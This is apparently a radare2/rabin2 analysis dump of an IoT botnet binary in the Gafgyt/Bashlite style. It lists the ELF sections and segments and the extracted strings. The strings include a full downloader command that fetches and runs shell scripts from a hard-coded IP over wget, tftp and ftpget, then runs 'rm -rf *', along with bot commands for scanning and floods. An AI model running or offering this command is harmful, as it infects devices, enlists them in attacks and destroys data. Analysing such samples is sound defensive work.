Missing bin header main
Missing bin header dwarf
[Sections]

nth paddr         size vaddr        vsize perm name
―――――――――――――――――――――――――――――――――――――――――――――――――――
0   0x00000000     0x0 0x00000000     0x0 ---- 
1   0x000000e8    0x13 0x004000e8    0x13 -r-x .init
2   0x00000100  0xc6f8 0x00400100  0xc6f8 -r-x .text
3   0x0000c7f8     0xe 0x0040c7f8     0xe -r-x .fini
4   0x0000c820  0x24d0 0x0040c820  0x24d0 -r-- .rodata
5   0x0000ecf0     0x4 0x0040ecf0     0x4 -r-- .eh_frame
6   0x0000f000    0x10 0x0050f000    0x10 -rw- .ctors
7   0x0000f010    0x10 0x0050f010    0x10 -rw- .dtors
8   0x0000f020     0x8 0x0050f020     0x8 -rw- .jcr
9   0x0000f040   0x510 0x0050f040   0x510 -rw- .data
10  0x0000f550     0x0 0x0050f560  0x68e8 -rw- .bss
11  0x0000f550   0x8b8 0x00000000   0x8b8 ---- .comment
12  0x0000fe08    0x56 0x00000000    0x56 ---- .shstrtab

[Segments]

nth paddr         size vaddr        vsize perm name
―――――――――――――――――――――――――――――――――――――――――――――――――――
0   0x00000000  0xecf4 0x00400000  0xecf4 -r-x LOAD0
1   0x0000f000   0x550 0x0050f000  0x6e48 -rw- LOAD1
2   0x00000000     0x0 0x00000000     0x0 -rw- GNU_STACK
3   0x00000000    0x40 0x00400000    0x40 -rw- ehdr

[Entrypoints]
vaddr=0x00400194 paddr=0x00000194 haddr=0x00000018 hvaddr=0x00400018 type=program

1 entrypoints
[Constructors]

0 entrypoints
[Imports]
nth vaddr bind type lib name
――――――――――――――――――――――――――――

[Symbols]

nth paddr vaddr bind type size lib name
―――――――――――――――――――――――――――――――――――――――
[Strings]
nth paddr      vaddr      len size section type    string
―――――――――――――――――――――――――――――――――――――――――――――――――――――――――
0   0x0000c820 0x0040c820 409 410  .rodata ascii   cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://206.189.233.129/bins.sh; chmod 777 bins.sh; sh bins.sh; tftp 206.189.233.129 -c get tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh; tftp -r tftp2.sh -g 206.189.233.129; chmod 777 tftp2.sh; sh tftp2.sh; ftpget -v -u anonymous -p anonymous -P 21 206.189.233.129 ftp1.sh ftp1.sh; sh ftp1.sh; rm -rf bins.sh tftp1.sh tftp2.sh ftp1.sh; rm -rf *; exit\r\n
34  0x0000d392 0x0040d392 7   8    .rodata ascii   SCANNER
35  0x0000d39a 0x0040d39a 16  17   .rodata ascii   SCANNER ON | OFF
36  0x0000d3af 0x0040d3af 14  15   .rodata ascii   REMOVING PROBE
37  0x0000d3c1 0x0040d3c1 7   8    .rodata ascii   PROBING
38  0x0000d3c9 0x0040d3c9 4   5    .rodata ascii   HOLD
39  0x0000d3ce 0x0040d3ce 4   5    .rodata ascii   JUNK
40  0x0000d3d7 0x0040d3d7 4   5    .rodata ascii   HTTP
41  0x0000d3e0 0x0040d3e0 5   6    .rodata ascii   COMBO
42  0x0000d3ea 0x0040d3ea 8   9    .rodata ascii   KILLATTK
43  0x0000d3f3 0x0040d3f3 7   8    .rodata ascii   FUCKOFF
44  0x0000d3fb 0x0040d3fb 7   8    .rodata ascii   8.8.8.8
45  0x0000d403 0x0040d403 15  16   .rodata ascii   /proc/net/route
46  0x0000d413 0x0040d413 10  11   .rodata ascii   \t00000000\t
47  0x0000d41e 0x0040d41e 5   6    .rodata ascii   DONGS
48  0x0000d424 0x0040d424 18  19   .rodata ascii   /usr/sbin/dropbear
49  0x0000d437 0x0040d437 9   10   .rodata ascii   BUILD %s\n
50  0x0000d444 0x0040d444 8   9    .rodata ascii   BUILD %s
51  0x0000d44d 0x0040d44d 4   5    .rodata ascii   PONG
52  0x0000d459 0x0040d459 7   8    .rodata ascii   %s 2>&1
53  0x0000d88e 0x0040d88e 7   16   .rodata utf16le \a\b\t\n\v\f\r
54  0x0000d8c0 0x0040d8c0 95  192  .rodata utf16le  !"#$%&'()*+,-./0123456789:;<=>?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[\]^_`ABCDEFGHIJKLMNOPQRSTUVWXYZ{|}~
55  0x0000da83 0x0040da83 7   8    .rodata ascii   /bin/sh
56  0x0000dac8 0x0040dac8 5   6    .rodata ascii   (nil)
57  0x0000dace 0x0040dace 6   7    .rodata ascii   (null)
58  0x0000dae4 0x0040dae4 4   5    .rodata ascii   \b\n\n\n
59  0x0000daf0 0x0040daf0 8   9    .rodata ascii   hlLjztqZ
60  0x0000db40 0x0040db40 20  21   .rodata ascii   npxXoudifFeEgGaACScs
61  0x0000db55 0x0040db55 7   8    .rodata ascii    +0-#'I
62  0x0000db84 0x0040db84 14  15   .rodata ascii   Unknown error 
63  0x0000dba0 0x0040dba0 7   8    .rodata ascii   Success
